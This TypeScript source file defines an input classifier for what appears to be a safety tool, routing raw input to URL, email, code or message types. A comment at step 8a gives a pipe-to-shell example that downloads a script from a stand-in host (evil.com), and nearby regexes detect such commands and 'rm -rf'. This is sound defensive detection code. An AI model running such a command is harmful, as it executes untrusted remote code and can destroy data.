import { SafetyInput, SafetyInputType } from '../types';

/**
 * Classifies raw user input into an appropriate SafetyInputType.
 * Deterministic heuristic based on syntax, protocols, structure, and metadata.
 */
export class InputClassifier {
  private static URL_REGEX = /^(https?:\/\/|www\.)[^\s/$.?#].[^\s]*$/i;
  private static EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  private static EMAIL_HEADER_REGEX = /^(from:|to:|subject:|date:|received:)/im;
  
  // Code indicators
  private static CODE_INDICATORS = [
    /\bfunction\s*\(/,
    /\b(?:const|let|var)\s+\w+(?:\s*:\s*[\w<>[\]]+)?\s*=/,
    /\b(?:interface|type)\s+\w+\s*[{<=]/,
    /\bimport\s+[\w\s,{*]+\s+from\b/,
    /\bimport\s+[\w\s,]+/,
    /\bfrom\s+[\w.]+\s+import\b/,
    /\bexport\s+(?:default\s+)?(?:class|function|const|let|interface|type)\b/,
    /\bdef\s+\w+\s*\([^)]*\):?/,
    /\bclass\s+\w+[\s{:(]/,
    /#include\s*<.*>/,
    /<\?php/,
    /\bSELECT\b.*\bFROM\b/i,
    /<\/?[a-z][\s\S]*>/i, // HTML
  ];

  static classify(input: SafetyInput): SafetyInputType {
    // 1. Explicit type provided in metadata or input
    if (input.type) {
      return input.type;
    }

    // 2. MIME type inspection
    if (input.mimeType) {
      const normMime = input.mimeType.toLowerCase().split(';')[0].trim();
      if (normMime.startsWith('image/')) {
        return 'image';
      }
      if (
        normMime === 'application/javascript' ||
        normMime === 'text/javascript' ||
        normMime === 'application/typescript' ||
        normMime === 'text/typescript' ||
        normMime === 'text/x-python' ||
        normMime === 'application/x-python' ||
        normMime === 'application/x-sh' ||
        normMime === 'text/x-shellscript' ||
        normMime === 'application/sql' ||
        normMime === 'text/x-sql' ||
        normMime === 'application/json' ||
        normMime === 'application/x-yaml' ||
        normMime === 'text/yaml' ||
        normMime === 'text/x-yaml' ||
        normMime === 'application/x-php' ||
        normMime === 'text/x-php' ||
        normMime === 'text/x-go' ||
        normMime === 'application/x-go'
      ) {
        return 'code';
      }
      if (
        normMime === 'application/pdf' ||
        normMime.includes('officedocument') ||
        normMime.includes('msword')
      ) {
        return 'document';
      }
    }

    // 3. Filename inspection
    if (input.filename) {
      const lower = input.filename.toLowerCase();
      if (/\.(jpg|jpeg|png|webp|gif|bmp|svg)$/.test(lower)) {
        return 'image';
      }
      if (/\.(pdf|docx|doc|pptx|xlsx|odt)$/.test(lower)) {
        return 'document';
      }
      if (/\.(js|mjs|cjs|ts|tsx|mts|cts|jsx|py|go|rs|c|cpp|cc|cxx|h|hpp|java|php|rb|sh|bash|zsh|sql|html|htm|css|json|ya?ml)$/.test(lower)) {
        return 'code';
      }
    }

    const trimmed = input.rawContent.trim();

    // 4. Pure URL detection & natural URL query detection
    if (!/\s/.test(trimmed)) {
      if (this.URL_REGEX.test(trimmed) || /^https?:\/\//i.test(trimmed) || /^www\.[a-zA-Z0-9\-]+\.[a-zA-Z]{2,}/i.test(trimmed)) {
        return 'url';
      }
    } else {
      // Natural URL check inquiry (e.g. "Check this: https://example.com", "Is this website safe: https://example.com")
      const urlIntentRegex = /^(?:check(?:\s+this)?(?:\s+(?:url|link|site|website))?|is\s+this(?:\s+(?:url|link|site|website))?\s+safe|verify(?:\s+this)?(?:\s+(?:url|link|site|website))?|scan(?:\s+this)?(?:\s+(?:url|link|site|website))?|inspect(?:\s+this)?(?:\s+(?:url|link|site|website))?)[:\s]+(?:https?:\/\/[^\s]+|www\.[^\s]+)$/i;
      if (urlIntentRegex.test(trimmed)) {
        return 'url';
      }
    }

    // 5. Email address or raw email headers
    if (this.EMAIL_REGEX.test(trimmed) || this.EMAIL_HEADER_REGEX.test(trimmed)) {
      return 'email';
    }

    // 6. Markdown fenced code blocks (e.g. ```javascript ... ```)
    if (trimmed.startsWith('```') || /^```[a-zA-Z0-9_-]*\s*[\r\n][\s\S]+?```$/m.test(trimmed)) {
      return 'code';
    }

    // 7. Shebang scripts (e.g. #!/bin/bash, #!/usr/bin/env python)
    if (/^#!\s*\/(?:usr\/)?(?:bin|local\/bin)\/(?:env\s+)?(?:bash|sh|zsh|python[0-9.]*|node|perl|ruby|php)\b/m.test(trimmed)) {
      return 'code';
    }

    // 8. Conversational check to prevent natural queries (e.g. "How do I write a Python function?") from routing to code
    const isConversational = /^(?:how\s+(?:do|can|to|would|should)|what\s+(?:is|are|does|do|can)|can\s+you|could\s+you|please\s+(?:explain|help|show|tell)|why\s+(?:is|are|do|does)|tell\s+me\s+about|help\s+me\s+with|is\s+it\s+safe\s+to|should\s+i)\b/i.test(trimmed);

    if (!isConversational) {
      // 8a. Shell pipeline execution (e.g. curl -sSL https://evil.com/setup.sh | bash)
      if (/^(?:curl|wget)\s+[^\n|]+(?:\s*\|\s*(?:bash|sh|zsh|python[0-9.]*|sudo\s+bash|sudo\s+sh))\b/m.test(trimmed)) {
        return 'code';
      }

      // 8b. Standalone terminal administration / destructive shell commands
      if (/^(?:sudo\s+)?(?:rm\s+-[a-zA-Z]*r[a-zA-Z]*f|chmod\s+[0-7]{3,4}|chown\s+[\w:-]+)\s+/m.test(trimmed)) {
        return 'code';
      }

      // 8c. Package manager / runtime commands
      if (/^(?:npm\s+(?:install|i|run|test|start)|pip(?:3)?\s+install|docker\s+(?:run|exec|build)|cargo\s+run|go\s+run)\s+/m.test(trimmed)) {
        return 'code';
      }

      // 8d. SQL statements (e.g. SELECT * FROM users WHERE id = '...)
      if (/^\s*(?:SELECT\b[\s\S]+\bFROM\b|INSERT\s+INTO\b|UPDATE\s+\w+\s+SET\b|DELETE\s+FROM\b|DROP\s+TABLE\b|CREATE\s+TABLE\b|ALTER\s+TABLE\b)/i.test(trimmed)) {
        return 'code';
      }

      // 8e. PHP script markers
      if (/<\?php|<\?=/i.test(trimmed)) {
        return 'code';
      }

      // 8f. Go package declaration / function
      if (/^\s*(?:package\s+main\b|func\s+[a-zA-Z0-9_]+\s*\([^)]*\)\s*[{])/m.test(trimmed)) {
        return 'code';
      }

      // 8g. Structured JSON object or array
      if ((trimmed.startsWith('{') && trimmed.endsWith('}')) || (trimmed.startsWith('[') && trimmed.endsWith(']'))) {
        try {
          const parsed = JSON.parse(trimmed);
          if (typeof parsed === 'object' && parsed !== null) {
            return 'code';
          }
        } catch {
          // Not valid JSON
        }
      }

      // 8h. Structured YAML document header
      if (/^---\s*[\r\n]/.test(trimmed)) {
        return 'code';
      }
    }

    // 9. Multi-factor code indicator matching
    let codeMatches = 0;
    for (const pattern of this.CODE_INDICATORS) {
      if (pattern.test(trimmed)) {
        codeMatches++;
      }
    }
    if (!isConversational) {
      if (codeMatches >= 2 || (codeMatches >= 1 && (trimmed.includes(';') || trimmed.includes('{') || /:\s*$/m.test(trimmed) || /\breturn\b/.test(trimmed)))) {
        return 'code';
      }
    } else {
      // For conversational queries, require strong multi-line code evidence to classify as code
      if (codeMatches >= 3 && (trimmed.includes(';') || trimmed.includes('{'))) {
        return 'code';
      }
    }

    // 10. QR detection if metadata specifies QR payload
    if (input.metadata?.isQr) {
      return 'qr';
    }

    // Default to message / content
    return 'message';
  }
}
